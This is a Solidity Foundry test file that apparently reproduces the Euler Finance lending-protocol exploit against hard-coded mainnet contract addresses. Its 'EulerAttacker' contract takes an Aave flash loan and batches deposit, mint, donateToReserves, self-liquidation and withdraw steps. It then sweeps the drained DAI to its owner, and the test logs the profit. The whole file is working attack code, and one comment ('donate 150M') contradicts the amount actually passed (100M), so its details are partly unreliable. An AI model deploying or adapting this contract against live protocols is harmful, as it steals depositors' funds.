// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IEulerExec {
    struct EulerBatchItem { bool allowError; address proxyAddr; bytes data; }
    function batchDispatch(EulerBatchItem[] calldata items, address[] calldata deferLiquidityChecks) external;
}

interface IEToken {
    function deposit(uint subAccountId, uint amount) external;
    function withdraw(uint subAccountId, uint amount) external;
    function mint(uint subAccountId, uint amount) external;
    function donateToReserves(uint subAccountId, uint amount) external;
    function balanceOf(address account) external view returns (uint256);
    function balanceOfUnderlying(address account) external view returns (uint256);
}

interface IDToken {
    function balanceOf(address account) external view returns (uint256);
}

interface IAaveV2 {
    function flashLoan(address, address[] calldata, uint256[] calldata, uint256[] calldata, address, bytes calldata, uint16) external;
}

contract EulerAttacker {
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant EXEC = 0x59828FdF7ee634AaaD3f58B19fDBa3b03E2D9d80;
    address constant MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3;
    address constant LIQUIDATION = 0x7123C8cBBD76c5C7fCC9f7150f23179bec0bA341;
    address constant AAVE = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    
    address public owner;
    address public underlying;
    address public eToken;
    
    constructor() { owner = msg.sender; }
    
    function attack(address _underlying, address _eToken, uint256 flashAmt, uint256 depositAmt, uint256 mintAmt, uint256 donateAmt) external {
        require(msg.sender == owner);
        underlying = _underlying;
        eToken = _eToken;
        
        address[] memory assets = new address[](1);
        assets[0] = _underlying;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmt;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        
        IAaveV2(AAVE).flashLoan(address(this), assets, amounts, modes, address(this),
            abi.encode(depositAmt, mintAmt, donateAmt), 0);
    }
    
    function executeOperation(
        address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums,
        address, bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE);
        (uint256 depositAmt, uint256 mintAmt, uint256 donateAmt) = abi.decode(params, (uint256, uint256, uint256));
        
        IERC20(underlying).approve(EULER, type(uint256).max);
        
        // Build batch: enter + deposit + mint + donate + liquidate + withdraw (sub1)
        IEulerExec.EulerBatchItem[] memory items = new IEulerExec.EulerBatchItem[](6);
        
        items[0] = IEulerExec.EulerBatchItem(false, MARKETS,
            abi.encodeWithSignature("enterMarket(uint256,address)", 0, underlying));
        items[1] = IEulerExec.EulerBatchItem(false, eToken,
            abi.encodeWithSignature("deposit(uint256,uint256)", 0, depositAmt));
        items[2] = IEulerExec.EulerBatchItem(false, eToken,
            abi.encodeWithSignature("mint(uint256,uint256)", 0, mintAmt));
        items[3] = IEulerExec.EulerBatchItem(false, eToken,
            abi.encodeWithSignature("donateToReserves(uint256,uint256)", 0, donateAmt));
        items[4] = IEulerExec.EulerBatchItem(false, LIQUIDATION,
            abi.encodeWithSignature("liquidate(address,address,address,uint256,uint256)",
                address(this), underlying, underlying, type(uint256).max, 0));
        items[5] = IEulerExec.EulerBatchItem(false, eToken,
            abi.encodeWithSignature("withdraw(uint256,uint256)", 1, type(uint256).max));
        
        address[] memory defer = new address[](2);
        defer[0] = address(this);
        defer[1] = address(uint160(uint160(address(this)) ^ 1));
        
        IEulerExec(EXEC).batchDispatch(items, defer);
        
        // Repay flash
        uint256 owed = amounts[0] + premiums[0]; IERC20(underlying).approve(AAVE, owed);
        return true;
    }
    
    function sweep(address token) external {
        require(msg.sender == owner);
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(owner, bal);
    }
    
    receive() external payable {}
}

contract TestEulerFull is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant eDAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
    address constant dDAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
    
    function testFullEulerDrainDAI() public {
        EulerAttacker attacker = new EulerAttacker();
        
        uint256 daiInEulerBefore = IERC20(DAI).balanceOf(EULER);
        emit log_named_uint("DAI in Euler before", daiInEulerBefore);
        
        // Flash 30M DAI, deposit 20M, mint 180M (9x), donate 150M
        attacker.attack(DAI, eDAI, 30_000_000e18, 20_000_000e18, 180_000_000e18, 100_000_000e18);
        attacker.sweep(DAI);
        
        uint256 daiProfit = IERC20(DAI).balanceOf(address(this));
        uint256 daiInEulerAfter = IERC20(DAI).balanceOf(EULER);
        
        emit log_named_uint("DAI profit", daiProfit);
        emit log_named_uint("DAI in Euler after", daiInEulerAfter);
        emit log_named_uint("DAI drained", daiInEulerBefore > daiInEulerAfter ? daiInEulerBefore - daiInEulerAfter : 0);
    }
    
    receive() external payable {}
}
